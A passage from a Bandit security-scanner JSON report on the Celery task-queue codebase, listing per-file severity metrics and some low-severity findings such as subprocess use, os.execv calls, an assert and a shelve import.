\"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 404,\n      \"nosec\": 0\n    },\n    \"celery/platforms.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 631,\n      \"nosec\": 0\n    },\n    \"celery/result.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 843,\n      \"nosec\": 0\n    },\n    \"celery/schedules.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 674,\n      \"nosec\": 0\n    },\n    \"celery/security/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 54,\n      \"nosec\": 0\n    },\n    \"celery/security/certificate.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 73,\n      \"nosec\": 0\n    },\n    \"celery/security/key.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 24,\n      \"nosec\": 0\n    },\n    \"celery/security/serialization.py\": {\n      \"CONFIDENCE.HIGH\": 3.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 3.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 78,\n      \"nosec\": 0\n    },\n    \"celery/security/utils.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 21,\n      \"nosec\": 0\n    },\n    \"celery/signals.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 131,\n      \"nosec\": 0\n    },\n    \"celery/states.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 95,\n      \"nosec\": 0\n    },\n    \"celery/utils/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 31,\n      \"nosec\": 0\n    },\n    \"celery/utils/abstract.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 109,\n      \"nosec\": 0\n    },\n    \"celery/utils/collections.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 595,\n      \"nosec\": 0\n    },\n    \"celery/utils/debug.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 148,\n      \"nosec\": 0\n    },\n    \"celery/utils/deprecated.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 90,\n      \"nosec\": 0\n    },\n    \"celery/utils/dispatch/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 3,\n      \"nosec\": 0\n    },\n    \"celery/utils/dispatch/signal.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 262,\n      \"nosec\": 0\n    },\n    \"celery/utils/functional.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 1.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 290,\n      \"nosec\": 0\n    },\n    \"celery/utils/graph.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 244,\n      \"nosec\": 0\n    },\n    \"celery/utils/imports.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 115,\n      \"nosec\": 0\n    },\n    \"celery/utils/iso8601.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 62,\n      \"nosec\": 0\n    },\n    \"celery/utils/log.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 215,\n      \"nosec\": 0\n    },\n    \"celery/utils/nodenames.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 71,\n      \"nosec\": 0\n    },\n    \"celery/utils/objects.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 107,\n      \"nosec\": 0\n    },\n    \"celery/utils/saferepr.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 190,\n      \"nosec\": 0\n    },\n    \"celery/utils/serialization.py\": {\n      \"CONFIDENCE.HIGH\": 5.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 4.0,\n      \"SEVERITY.MEDIUM\": 1.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 209,\n      \"nosec\": 0\n    },\n    \"celery/utils/static/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 8,\n      \"nosec\": 0\n    },\n    \"celery/utils/sysinfo.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 32,\n      \"nosec\": 0\n    },\n    \"celery/utils/term.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 128,\n      \"nosec\": 0\n    },\n    \"celery/utils/text.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 136,\n      \"nosec\": 0\n    },\n    \"celery/utils/threads.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 256,\n      \"nosec\": 0\n    },\n    \"celery/utils/time.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 293,\n      \"nosec\": 0\n    },\n    \"celery/utils/timer2.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 118,\n      \"nosec\": 0\n    },\n    \"celery/worker/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 3,\n      \"nosec\": 0\n    },\n    \"celery/worker/autoscale.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 123,\n      \"nosec\": 0\n    },\n    \"celery/worker/components.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 188,\n      \"nosec\": 0\n    },\n    \"celery/worker/consumer/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 14,\n      \"nosec\": 0\n    },\n    \"celery/worker/consumer/agent.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 14,\n      \"nosec\": 0\n    },\n    \"celery/worker/consumer/connection.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 25,\n      \"nosec\": 0\n    },\n    \"celery/worker/consumer/consumer.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 493,\n      \"nosec\": 0\n    },\n    \"celery/worker/consumer/control.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 23,\n      \"nosec\": 0\n    },\n    \"celery/worker/consumer/events.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 50,\n      \"nosec\": 0\n    },\n    \"celery/worker/consumer/gossip.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 173,\n      \"nosec\": 0\n    },\n    \"celery/worker/consumer/heart.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 26,\n      \"nosec\": 0\n    },\n    \"celery/worker/consumer/mingle.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 58,\n      \"nosec\": 0\n    },\n    \"celery/worker/consumer/tasks.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 45,\n      \"nosec\": 0\n    },\n    \"celery/worker/control.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 424,\n      \"nosec\": 0\n    },\n    \"celery/worker/heartbeat.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 47,\n      \"nosec\": 0\n    },\n    \"celery/worker/loops.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 92,\n      \"nosec\": 0\n    },\n    \"celery/worker/pidbox.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 96,\n      \"nosec\": 0\n    },\n    \"celery/worker/request.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 578,\n      \"nosec\": 0\n    },\n    \"celery/worker/state.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 208,\n      \"nosec\": 0\n    },\n    \"celery/worker/strategy.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 175,\n      \"nosec\": 0\n    },\n    \"celery/worker/worker.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 338,\n      \"nosec\": 0\n    }\n  },\n  \"results\": [\n    {\n      \"code\": \"8 from functools import partial\\n9 from subprocess import Popen\\n10 from time import sleep\\n\",\n      \"filename\": \"celery/apps/multi.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Consider possible security implications associated with Popen module.\",\n      \"line_number\": 9,\n      \"line_range\": [\n        9\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b404-import-subprocess\",\n      \"test_id\": \"B404\",\n      \"test_name\": \"blacklist\"\n    },\n    {\n      \"code\": \"216         maybe_call(on_spawn, self, argstr=' '.join(argstr), env=env)\\n217         pipe = Popen(argstr, env=env)\\n218         return self.handle_process_exit(\\n\",\n      \"filename\": \"celery/apps/multi.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"subprocess call - check for execution of untrusted input.\",\n      \"line_number\": 217,\n      \"line_range\": [\n        217\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b603_subprocess_without_shell_equals_true.html\",\n      \"test_id\": \"B603\",\n      \"test_name\": \"subprocess_without_shell_equals_true\"\n    },\n    {\n      \"code\": \"341     ])\\n342     os.execv(sys.executable, [sys.executable] + sys.argv)\\n343 \\n\",\n      \"filename\": \"celery/apps/worker.py\",\n      \"issue_confidence\": \"MEDIUM\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Starting a process without a shell.\",\n      \"line_number\": 342,\n      \"line_range\": [\n        342\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b606_start_process_with_no_shell.html\",\n      \"test_id\": \"B606\",\n      \"test_name\": \"start_process_with_no_shell\"\n    },\n    {\n      \"code\": \"72             self.set(key, b'test value')\\n73             assert self.get(key) == b'test value'\\n74             self.delete(key)\\n\",\n      \"filename\": \"celery/backends/filesystem.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 73,\n      \"line_range\": [\n        73\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"6 import os\\n7 import shelve\\n8 import sys\\n\",\n      \"filename\": \"celery/beat.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Consider possible security implications associated with shelve module.\",\n      \"line_number\": 7,\n      \"line_range\": [\n        7\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b403-import-pickle\",\n      \"test_id\": \"B403\",\n      \"test_name\": \"blacklist\"\n    },\n    {\n      \"code\": \"124                 path = executable\\n125             os.execv(path, [path] + argv)\\n126             return EX_OK\\n\",\n      \"filename\": \"celery/bin/worker.py\",\n      \"issue_confidence\": \"MEDIUM\",\n      